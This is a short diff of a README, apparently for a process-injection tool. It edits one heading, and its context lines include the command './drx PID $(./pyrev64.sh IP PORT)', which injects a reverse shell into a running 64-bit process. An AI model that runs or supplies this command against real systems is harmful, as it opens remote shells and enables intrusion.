@@ -59,7 +59,7 @@ Based from: https://github.com/David-Reguera-Garcia-Dreg/python_reverse_shell_de
 
 Steps for **64 bit process**:
 
-#### Using pyrev64.sh script
+#### Using pyrev64.sh script way
 
 Just execute **./drx PID $(./pyrev64.sh IP PORT)**
 
